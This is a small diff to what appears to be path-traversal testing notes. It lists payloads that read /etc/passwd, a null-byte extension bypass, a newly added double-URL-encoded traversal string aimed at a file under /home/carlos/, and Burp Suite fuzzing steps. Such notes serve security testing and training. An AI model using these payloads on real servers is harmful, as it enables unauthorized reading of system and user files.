@@ -13,6 +13,10 @@
 /var/www/../../../etc/passwd
 ../../../../../etc/passwd%00.jpg # bypass extension  via byte null
 
+
+..%252f..%252f..%252f..%252f..%252f..%252f..%252fhome/carlos/%252537%33%2536%2536%2533%2537%32%2536%35%2537%34
+
+
 In burpsuite professional you can add a list to fuzzing path traversal.
 
 After that: payload processing -> add rule -> match & replace -> \{file\} for <file-you-want>
